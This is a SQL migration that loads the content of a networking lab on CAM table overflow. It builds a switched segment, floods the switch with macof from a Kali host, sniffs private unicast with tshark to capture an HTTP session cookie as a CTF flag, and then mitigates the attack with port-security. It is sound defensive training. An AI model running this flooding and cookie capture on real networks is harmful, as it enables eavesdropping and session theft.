-- ═══════════════════════════════════════════════════════
-- Lab 46 (id=46) — CAM Overflow : full content (Vol 1 · Ch 5)
-- ═══════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Turn a switch into a hub. Flood the CAM table with macof, capture traffic that should be private, then lock it down with port-security.',
    topic = 'switching',
    difficulty = 'hard',
    book_ref = 'Vol 1 · Ch 5'
WHERE id = 46;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Stand up the segment & prove isolation',
  is_pro_only = false,
  content = $md$
<div class="phase build">
    <div class="phase-head">
      <span class="phase-tag">Build</span>
      <h3>Stand up the segment &amp; prove isolation</h3>
    </div>
    <p class="goal">One VLAN, three access ports. Before you can appreciate the attack, you have to see the switch doing its job correctly — unicast staying private.</p>

    <div class="step">
      <div class="step-label"><span class="n">1</span> Configure SW1 access ports (all VLAN 10)</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">SW1(config)#</span> vlan 10
<span class="prompt">SW1(config)#</span> interface range e0/1 - 3
<span class="prompt">SW1(config-if-range)#</span> switchport mode access
<span class="prompt">SW1(config-if-range)#</span> switchport access vlan 10
<span class="prompt">SW1(config-if-range)#</span> no shutdown</pre>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">2</span> Look at an empty-ish CAM table</div>
      <p>Send a couple of pings between PC-A and PC-B so the switch learns their MACs, then inspect what it recorded:</p>
      <pre><button class="copy-btn">copy</button><span class="prompt">SW1#</span> show mac address-table dynamic vlan 10
<span class="cmt">          Mac Address Table
-------------------------------------------
Vlan    Mac Address       Type      Ports
----    -----------       ----      -----
  10    aabb.cc00.0100    DYNAMIC   Et0/1     </span><span class="cmt">← PC-A</span>
<span class="cmt">  10    aabb.cc00.0200    DYNAMIC   Et0/2     ← PC-B</span></pre>
      <div class="note why"><strong>Why this matters:</strong> two entries. When PC-A frames PC-B, SW1 sees the destination MAC in this table pointing at e0/2 and forwards it <em>only</em> there. Kali on e0/3 is deaf to it.</div>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">3</span> Prove Kali can't hear the conversation</div>
      <p>Start a capture on Kali filtered to the two hosts, then generate traffic between them (PC-A pulls a page from PC-B). Expect <em>silence</em> on Kali:</p>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> tshark -i eth0 -f "host 10.0.10.10 and host 10.0.10.20"
<span class="cmt"># ... nothing. The switch is doing its job. This is your baseline.</span></pre>
    </div>
  </div>
$md$
WHERE lab_id = 46 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Flood the table, drink the traffic',
  is_pro_only = false,
  content = $md$
<div class="phase attack">
    <div class="phase-head">
      <span class="phase-tag">Attack</span>
      <h3>Flood the table, drink the traffic</h3>
    </div>
    <p class="goal">macof generates a torrent of frames with random source MACs. Each new source MAC the switch dutifully tries to learn — until the table is full and it can no longer track where real hosts live.</p>

    <div class="step">
      <div class="step-label"><span class="n">1</span> Open the flood from Kali's port</div>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ macof -i eth0</span>
<span class="cmt"># ~155,000 frames/min of random src MACs. Leave it running.</span></pre>
      <div class="note watch"><strong>Watch it fill:</strong> on SW1, poll the table depth while macof runs — you'll see it race toward the platform limit.</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">SW1#</span> show mac address-table count
<span class="cmt">Dynamic Address Count:  <b>8189</b>   ← pinned at the platform max</span></pre>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">2</span> Re-run the capture — now it fails open</div>
      <p>With the table saturated, SW1 can't learn PC-A/PC-B fresh entries as they age out, so their unicast becomes <em>unknown</em> and gets flooded out every port in VLAN 10 — e0/3 included. Repeat the exact capture from the build phase:</p>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> tshark -i eth0 -f "host 10.0.10.10 and host 10.0.10.20" -Y http
<span class="cmt"># frames now pour in — the switch is behaving like a hub</span></pre>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">3</span> Pull the secret off the wire</div>
      <p>Have PC-A authenticate to PC-B's little web service (cleartext, like a lazy internal tool). Follow the HTTP stream on Kali and lift the session token — that's your flag:</p>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> tshark -i eth0 -Y 'http.cookie' -T fields -e http.cookie
<span class="cmt">SESSION=NB3-c4m-0v3rfl0w-9f2a</span></pre>
    </div>

    <div class="flag">
      <div class="flag-label">🚩 Flag</div>
      <h4>Recover the session token PC-A sent to PC-B.</h4>
      <div class="flag-row">
        <input id="flag-in" placeholder="NB3-...">
        <button onclick="checkFlag()">Submit</button>
      </div>
      <div class="flag-msg" id="flag-msg"></div>
    </div>

    <details class="hint"><summary>Hint 1 — macof runs but Kali still sees nothing</summary>
      <p>Two usual causes. Either the table hasn't fully saturated yet (give it a few seconds and confirm with <code>show mac address-table count</code>), or the existing PC-A/PC-B entries haven't aged out — flooding only affects <em>unknown</em> unicast, so entries already learned keep forwarding normally until they expire (default 300s). Clear them with <code>clear mac address-table dynamic</code> to see the effect immediately, or just keep traffic flowing while macof holds the table full.</p>
    </details>
    <details class="hint"><summary>Hint 2 — why flooding, not spoofing?</summary>
      <p>You're not impersonating PC-B here (that's ARP spoofing, a different lab). You're removing the switch's <em>ability to be selective at all</em>. A full CAM table degrades the whole VLAN to hub behaviour — every unknown unicast goes everywhere. It's noisier and easier to detect than ARP poisoning, but it needs zero knowledge of the victims.</p>
    </details>
  </div>
$md$
WHERE lab_id = 46 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Cap the port, kill the flood',
  is_pro_only = false,
  content = $md$
<div class="phase harden">
    <div class="phase-head">
      <span class="phase-tag">Harden</span>
      <h3>Cap the port, kill the flood</h3>
    </div>
    <p class="goal">The flood works because one port can introduce unlimited source MACs. Port security bounds that: tell the switch how many MACs a port may ever present, and what to do when that's exceeded.</p>

    <div class="step">
      <div class="step-label"><span class="n">1</span> Lock the access ports</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">SW1(config)#</span> interface range e0/1 - 3
<span class="prompt">SW1(config-if-range)#</span> switchport port-security
<span class="prompt">SW1(config-if-range)#</span> switchport port-security maximum 2
<span class="prompt">SW1(config-if-range)#</span> switchport port-security mac-address sticky
<span class="prompt">SW1(config-if-range)#</span> switchport port-security violation restrict</pre>
      <div class="note why"><strong>Why <code>restrict</code>, not <code>shutdown</code>:</strong> both stop the flood. <code>restrict</code> drops the offending frames and increments a counter/SNMP trap but keeps the port up — you get logging and evidence without err-disabling a port (and a 2am phone call). Use <code>shutdown</code> on ports where any violation should mean lights-out.</div>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">2</span> Re-attack — and watch it die</div>
      <p>Fire macof again from Kali. The second MAC past the limit trips the violation; the port stops learning junk and the CAM table stays clean:</p>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ macof -i eth0</span>   <span class="cmt"># same command, now neutered</span>

<span class="prompt">SW1#</span> show port-security interface e0/3
<span class="cmt">Port Security          : Enabled
Port Status            : Secure-up
Violation Mode         : Restrict
Total MAC Addresses    : 2
<b>Security Violation Count : 41276</b>   ← flood is being dropped</span>

<span class="prompt">SW1#</span> show mac address-table count
<span class="cmt">Dynamic Address Count:  <b>3</b>   ← table intact. It held.</span></pre>
    </div>

    <div class="step">
      <div class="step-label"><span class="n">3</span> Confirm the capture goes quiet again</div>
      <p>Re-run the Attack-phase capture with macof still hammering. PC-A ↔ PC-B unicast is private once more — Kali is back to silence. Re-attack-to-confirm is the whole point: you didn't just apply a config, you proved it defeats the exact attack that worked five minutes ago.</p>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> tshark -i eth0 -f "host 10.0.10.10 and host 10.0.10.20"
<span class="cmt"># silence restored ✓</span></pre>
    </div>
  </div>
$md$
WHERE lab_id = 46 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  46,
  $svg$<svg viewBox="0 0 720 300" role="img" aria-label="Network topology: one switch with two legitimate hosts and one Kali attacker">
      <!-- switch -->
      <rect x="290" y="30" width="140" height="46" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="360" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="360" y="68" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">IOU L2 · VLAN 10</text>

      <!-- links -->
      <line x1="330" y1="76" x2="150" y2="210" stroke="#2563eb" stroke-width="2"/>
      <line x1="360" y1="76" x2="360" y2="210" stroke="#2563eb" stroke-width="2"/>
      <line x1="390" y1="76" x2="575" y2="210" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>

      <!-- port labels -->
      <text x="250" y="140" font-family="monospace" font-size="10" fill="#64748b">e0/1</text>
      <text x="368" y="140" font-family="monospace" font-size="10" fill="#64748b">e0/2</text>
      <text x="470" y="140" font-family="monospace" font-size="10" fill="#e5484d">e0/3</text>

      <!-- PC-A -->
      <rect x="90" y="210" width="120" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="150" y="232" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-A</text>
      <text x="150" y="248" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">10.0.10.10 · finance</text>

      <!-- PC-B -->
      <rect x="300" y="210" width="120" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="360" y="232" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-B</text>
      <text x="360" y="248" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">10.0.10.20 · server</text>

      <!-- Kali -->
      <rect x="515" y="210" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="575" y="232" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="575" y="248" text-anchor="middle" font-family="monospace" font-size="10" fill="#e5484d">10.0.10.66 · attacker</text>

      <text x="575" y="292" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">same VLAN, access port — no L3 hop needed</text>
    </svg>$svg$,
  $svg$<svg viewBox="0 0 720 300" role="img" aria-label="Network topology: one switch with two legitimate hosts and one Kali attacker">
      <!-- switch -->
      <rect x="290" y="30" width="140" height="46" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="360" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="360" y="68" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">IOU L2 · VLAN 10</text>

      <!-- links -->
      <line x1="330" y1="76" x2="150" y2="210" stroke="#2563eb" stroke-width="2"/>
      <line x1="360" y1="76" x2="360" y2="210" stroke="#2563eb" stroke-width="2"/>
      <line x1="390" y1="76" x2="575" y2="210" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>

      <!-- port labels -->
      <text x="250" y="140" font-family="monospace" font-size="10" fill="#64748b">e0/1</text>
      <text x="368" y="140" font-family="monospace" font-size="10" fill="#64748b">e0/2</text>
      <text x="470" y="140" font-family="monospace" font-size="10" fill="#e5484d">e0/3</text>

      <!-- PC-A -->
      <rect x="90" y="210" width="120" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="150" y="232" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-A</text>
      <text x="150" y="248" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">10.0.10.10 · finance</text>

      <!-- PC-B -->
      <rect x="300" y="210" width="120" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="360" y="232" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-B</text>
      <text x="360" y="248" text-anchor="middle" font-family="monospace" font-size="10" fill="#64748b">10.0.10.20 · server</text>

      <!-- Kali -->
      <rect x="515" y="210" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="575" y="232" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="575" y="248" text-anchor="middle" font-family="monospace" font-size="10" fill="#e5484d">10.0.10.66 · attacker</text>

      <text x="575" y="292" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">same VLAN, access port — no L3 hop needed</text>
    </svg>$svg$,
  '[]'::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
